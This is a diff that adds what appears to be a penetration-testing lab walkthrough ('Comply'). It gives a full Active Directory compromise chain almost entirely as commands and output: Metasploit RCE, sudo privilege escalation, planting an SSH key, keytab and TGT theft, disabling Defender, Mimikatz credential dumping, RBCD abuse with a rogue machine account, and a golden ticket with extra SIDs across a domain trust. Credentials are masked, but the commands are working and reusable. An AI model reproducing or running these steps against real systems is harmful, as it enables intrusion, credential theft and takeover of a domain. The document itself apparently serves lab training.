@@ -1,1 +1,296 @@
-robertasa
+# Lab 5 - Comply
+
+On the web server, there is an OpenNetAdmin outdated and vulnerable to RCE. Possible to exploit easily with msf:
+
+    msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set RHOSTS 192.168.X.164
+    msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set LHOST tun0
+    msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set TARGETURI ''
+    msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run
+    msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > sessions 1
+    meterpreter > getuid
+    Server username: www-data
+
+Run shell, with interactive PTY, and privesc using sudo:
+
+meterpreter > `shell`  
+`python3 -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm`  
+www-data@web05:/opt/ona/www$ `sudo -l`  
+User www-data may run the following commands on web05:  (root) NOPASSWD: /usr/bin/find  
+www-data@web05:/opt/ona/www$ `sudo /usr/bin/find . -exec /bin/bash \; -quit`  
+root@web05:/opt/ona/www# `whoami`  
+root
+
+Add your Kali's SSH key for a better shell:  
+`mkdir -p /root/.ssh`  
+`echo 'ssh-ed25519 AA[...]b kali@kali' >> /root/.ssh/authorized_keys`  
+`chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys`
+
+We connect to it via SSH. Now, we can do `history` to see that Kerberos is used on this device, an pete is connected.
+
+Just copy the keytab SPN file to Kali with `scp root@192.168.X.164:/etc/krb5.keytab .`
+
+And we use https://github.com/sosdave/KeyTabExtract to decrypt it and recover NTLM hash of WEB05$:  
+`python3 ./keytabextract.py krb5.keytab`
+
+    [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+    [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+    [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+    [+] Keytab File successfully imported.
+        REALM : COMPLYEDGE.COM
+        SERVICE PRINCIPAL : WEB05$/
+        NTLM HASH : XXXXX
+        AES-256 HASH : YYYYY
+        AES-128 HASH : ZZZZZ
+
+## pete TGT
+
+We can copy pete's TGT on our Kali:  
+`scp root@192.168.X.164:'/tmp/krb*' .`
+
+## Further enumeration
+
+Set up SSHuttle VPN:  
+`sshuttle -v -r root@192.168.X.164 172.16.X.0/24`
+
+And export KRB5 ticket, and run impacket commands:  
+`export KRB5CCNAME=./krb5cc_XXXXXX_YYYYY`  
+`impacket-GetADUsers complyedge.com/pete -no-pass -all -k -dc-ip 172.16.X.168`
+
+Run an nmap through the SSHuttle on the identified hosts.
+
+## Lateral movement to DMZ DC
+
+From root access on web05, switch to pete with `su - pete@complyedge.com`  
+
+pete@complyedge.com@web05:~$ `id`  
+
+    uid=XXXXXX(pete@complyedge.com) gid=XXXXXX(domain users@complyedge.com) groups=XXXXXX(domain users@complyedge.com),XXXXXX(domain admins@complyedge.com),XXXXXX(denied rodc password replication group@complyedge.com)
+
+pete is DA of complyedge, so we can go back on Kali with the previously imported TGT
+
+`impacket-psexec pete@dmzdc01.complyedge.com -k -no-pass -dc-ip 172.16.X.168 -target-ip 172.16.X.168`
+
+Disable Defender to drop Meterpreter, Mimikatz and SeatBelt (https://github.com/GhostPack/Seatbelt):  
+`Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend`
+
+C:\> `.\Seatbelt -group=all`
+
+    ====== InterestingProcesses ======
+    Category     : interesting
+        Name         : cmd.exe
+        Product      : Command Prompt
+        ProcessID    : XXX
+        Owner        : COMPLYEDGE\pete
+        CommandLine  : "C:\Windows\System32\cmd.exe" /c echo y | c:\users\pete\downloads\plink.exe -ssh -l pete@complyedge.com -pw XXXXXXXXXXXX web05
+
+Recover pete's private key and password, as well as other user's hashes (including JIM, for later use):  
+`.\mimikatz.exe "lsadump::lsa /patch" "exit"`
+
+## Cross-domain
+
+Now we will exploit cross domain, import PowerView, enumerate domains and run a new SharpHound check (SharpHound will identify a 3rd domain):  
+`Import-Module .\PowerView.ps1`  
+`Get-DomainTrust -API`  
+`.\SharpHound.exe --CollectionMethod All --Domain ops.comply.com`  
+`.\SharpHound.exe --CollectionMethod All --Domain complyedge.com`  
+`.\SharpHound.exe --CollectionMethod All --Domain comply.com`
+
+JIM (whose's hash has been dumped previously) is member of another's domain, visible with `Get-DomainForeignGroupMember -Domain ops.comply.com`
+
+We connect to FILE06 using its hash (still with sshuttle):
+`impacket-psexec complyedge.com/jim@172.16.X.166 -no-pass -hashes :XXXXXXXXXXXXX`
+
+## RBCD
+
+On this new machine, disable Defender, import PowerView, drop Rubeus and enumerate for Delegation:  
+`Get-DomainUser -allowdelegation -admincount`
+
+Create a NetOnly session with Rubeus:  
+PS C:\> `.\Rubeus.exe createnetonly /program:"C:\sessionrubeus.bat"`
+
+    [*] Action: Create Process (/netonly)
+
+    [*] Showing process : False
+    [+] Process         : 'C:\sessionrubeus.bat' successfully created with LOGON_TYPE = 9
+    [+] ProcessID       : 1234
+    [+] LUID            : 0xacbdef
+
+Import PowerMad, and create a machine account:  
+PS C:\> . .\Powermad.ps1  
+PS C:\> `New-MachineAccount -MachineAccount evil -Password $(ConvertTo-SecureString 'Abc!def123' -AsPlainText -Force) -Verbose`  
+
+    VERBOSE: [+] Domain Controller = cdc07.ops.comply.com
+    VERBOSE: [+] Domain = ops.comply.com
+    VERBOSE: [+] SAMAccountName = evil$
+    VERBOSE: [+] Distinguished Name = CN=evil,CN=Computers,DC=ops,DC=comply,DC=com
+    [+] Machine account evil added
+
+We add **msDS-AllowedToActOnBehalfOfOtherIdentity** because FILE06$ has GenericWrite to Jump09 (visible on BloodHound instead of too much noise):
+
+`Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}`
+
+Enable and import AD-Powershell module, then add the right:  
+PS C:\> `Import-Module ServerManager`  
+PS C:\> `Install-WindowsFeature -Name RSAT-AD-PowerShell`  
+
+    Success Restart Needed Exit Code      Feature Result                               
+    ------- -------------- ---------      --------------                               
+    True    No             Success        {Remote Server Administration Tools, Activ...
+
+PS C:\> `import-module activedirectory`  
+PS C:\> `Set-ADComputer jump09 -PrincipalsAllowedToDelegateToAccount evil$ -Server 172.16.X.165 -Verbose`
+
+    VERBOSE: Performing the operation "Set" on target "CN=JUMP09,OU=OpsServers,OU=OpsComputers,DC=ops,DC=comply,DC=com".
+
+And verify using `Get-DomainComputer jump09`
+
+## Getting a TGS for CIFS/jump09
+
+Compute the hash of your evil$ machine account:
+`.\Rubeus.exe hash /password:Acb!def123`
+
+Now, impersonate ops.comply.com\Administrator, specify the DC hostname and s4u command, to generate a TGS ticket for CIFS/jump09:  
+`.\Rubeus.exe s4u /msdsspn:cifs/jump09.ops.comply.com /domain:ops.comply.com /user:evil$ /rc4:PREVIOUSLY_HASH /impersonateuser:administrator /dc:172.16.X.165 /ptt`
+
+    [*] Action: S4U
+
+    [*] Using rc4_hmac hash: XXXXXXXXX
+    [*] Building AS-REQ (w/ preauth) for: 'ops.comply.com\evil$'
+    [+] TGT request successful!
+    [*] base64(ticket.kirbi):
+
+        doI[...]t
+
+
+    [*] Action: S4U
+
+    [*] Using domain controller: 172.16.X.165
+    [*] Building S4U2self request for: 'evil$@OPS.COMPLY.COM'
+    [*] Sending S4U2self request
+    [+] S4U2self success!
+    [*] Got a TGS for 'administrator' to 'evil$@OPS.COMPLY.COM'
+    [*] base64(ticket.kirbi):
+
+        doI[...]=
+
+    [*] Impersonating user 'administrator' to target SPN 'cifs/jump09.ops.comply.com'
+    [*] Using domain controller: 172.16.X.165
+    [*] Building S4U2proxy request for service: 'cifs/jump09.ops.comply.com'
+    [*] Sending S4U2proxy request
+    [+] S4U2proxy success!
+    [*] base64(ticket.kirbi) for SPN 'cifs/jump09.ops.comply.com':
+
+        doIG[...]t
+    [+] Ticket successfully imported!
+
+You can now klist and ls, or PsExec on JUMP09:  
+`klist`  
+`dir \\jump09.ops.comply.com\C$`
+
+        Directory: \\jump09.ops.comply.com\C$
+    Mode                LastWriteTime         Length Name
+    ----                -------------         ------ ----
+    d-----        01/01/2019 XX:XX PM                PerfLogs
+    d-r---        01/01/2019 XX:XX PM                Program Files
+    d-----        01/01/2019 XX:XX PM                Program Files (x86)
+
+You can use fileless lateral movement from PDF to execute commands, or simply PsExec on Windows, or you can export the ticket to Kali, convert it and:  
+`impacket-ticketConverter jump09adm_decoded.kirbi jump09adm.ccache`  
+`export KRB5CCNAME=./jump09adm.ccache`  
+`impacket-psexec -k -no-pass administrator@jump09.ops.comply.com -target-ip 172.16.X.167`
+
+Run Meterpreter or Mimikatz to dump creds and hashes on FILE06. We recover Pete's OPS.COMPLY.COM domain password
+
+meterpreter > `creds_all`
+
+    msv credentials
+    ===============
+
+    Username       Domain  NTLM                              SHA1                                      DPAPI
+    --------       ------  ----                              ----
+    Administrator  JUMP09  XXX  YYY
+    JUMP09$        OPS     XXX  YYY
+    JUMP09$        OPS     XXX  YYY
+    pete           OPS     XXX  YYY  ZZZ
+
+    kerberos credentials
+    ====================
+
+    Username       Domain          Password
+    --------       ------          --------
+    (null)         (null)          (null)
+    Administrator  JUMP09          (null)
+    JUMP09$        ops.comply.com  e8 [...]
+    JUMP09$        ops.comply.com  c3 [...]
+    jump09$        OPS.COMPLY.COM  e8 [...]
+    pete           OPS.COMPLY.COM  PETE_PASSWORD_XXX
+    pete           OPS.COMPLY.COM  (null)
+
+We can use the creds to connect on OPS DC, and run SharpHound in OPS context:  
+`evil-winrm -u ops.comply.com\\pete -p 'XXXXXX' -i 172.16.X.165`  
+*Evil-WinRM* PS C:\> `whoami`  
+*Evil-WinRM* PS C:\> `upload /home/kali/SharpHound.exe`  
+*Evil-WinRM* PS C:\> `.\SharpHound.exe --CollectionMethod All`
+
+## Extra SID domain transfer
+
+In BloodHound => enumerate domain trusts, we see that there is a trust between domains.  
+Plus, SID filtering is not enabled (probably due to previous migration):  
+PS C:\> `netdom trust ops.comply.com /domain:comply.com /quarantine`  
+
+    SID filtering is not enabled for this trust. All SIDs presented in an authentication request from this domain will be honored.
+
+Get domains SID either from PowerView:
+
+`Get-DomainSID -Domain ops.comply.com`
+
+    S-1-5-21-XXXXXX-YYYYYY-ZZZZZZZ2
+
+`Get-DomainSID -Domain comply.com`
+
+    S-1-5-21-XXXXXX-YYYYYY-ZZZZZZZ1
+
+or from Kali:  
+`impacket-lookupsid ops.comply.com/pete:XXXXXXXXX@172.16.X.165`
+
+So, Enterprise Admins SID is **S-1-5-21-XXXXXX-YYYYYY-ZZZZZZZ1-519**
+
+We disable Defender, we drop Mimikatz on DC and dump krbtgt NTLM:  
+*Evil-WinRM* PS C:\> `.\mimikatz.exe "lsadump::lsa /inject /name:krbtgt" "exit"`
+
+    User : krbtgt
+    * Primary
+        NTLM : XXXXX_KRBTGTNTLM
+        LM   :
+
+BEWARE ! Tickets in memory in Evil-WinRM is somehow buggy, use impacket-psexec instead !
+
+Generate the Golden ticket:  
+*Evil-WinRM* PS C:\Users\pete\Documents> `.\mimikatz.exe "kerberos::golden /user:Administrator /domain:OPS.COMPLY.COM /sid:S-1-5-21-XXXXX-OPSCOMPLYSID-YYYYY /krbtgt:XXXXX_KRBTGTNTLM /sids:S-1-5-21-XXXXX-COMPLYSID-ZZZZZ-519 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden.kirbi" "exit"`
+
+    User      : Administrator
+    Domain    : ops.comply.com (OPS)
+    SID       : S-1-5-21XXXXX-OPSCOMPLYSID-YYYYY
+    User Id   : 500
+    Groups Id : *513 512 520 518 519
+    Extra SIDs: S-1-5-21-XXXXX-COMPLYSID-ZZZZZ-519 ;
+    ServiceKey: XXXXX_KRBTGTNTLM - rc4_hmac_nt
+    -> Ticket : ** Pass The Ticket **
+
+    * PAC generated
+    * PAC signed
+    * EncTicketPart generated
+    * EncTicketPart encrypted
+    * KrbCred generated
+
+    Golden ticket for 'Administrator @ ops.comply.com' successfully submitted for current session
+
+Now import this ticket in a psexec session (issue with Evil-WinRM at this stage):  
+`impacket-psexec ops.comply.com/pete:XXXXXXXXXX@cdc07.ops.comply.com -target-ip 172.16.X.165`  
+C:\Users\pete\Documents> `.\mimikatz.exe "kerberos::ptt golden.kirbi" "exit"`  
+C:\Users\pete\Documents> `dir \\rdc02\c$`  
+
+    XXXXX  XX:XX AM    <DIR>          PerfLogs
+    XXXXX  XX:XX PM    <DIR>          Program Files
+
+Now, either import the ticket into Kali, or use fileless lateral movement, or PsExec, whatever you prefer !
